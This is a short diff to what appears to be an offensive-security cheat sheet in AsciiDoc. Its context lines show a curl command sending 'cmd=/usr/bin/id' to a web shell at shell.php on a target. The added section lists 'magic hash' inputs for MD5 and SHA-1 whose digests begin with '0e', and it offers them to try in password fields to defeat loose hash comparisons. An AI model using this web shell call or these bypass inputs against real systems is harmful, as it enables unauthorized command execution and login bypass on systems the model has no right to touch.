@@ -28,3 +28,15 @@ and some clever scripting.
 Use it with curl:
 
   curl -d 'cmd=/usr/bin/id' http://target/shell.php
+
+==== Magic Numbers
+
+Some strings will hash to strings that can be interpreted as numbers. Weird huh?
+
+Try the following inputs in password fields:
+
+|===
+|digest |input |output
+|md5 |240610708 |0e462097431906509019562988736854
+|sha1 |10932435112 |0e07766915004133176347055865026311692244
+|===
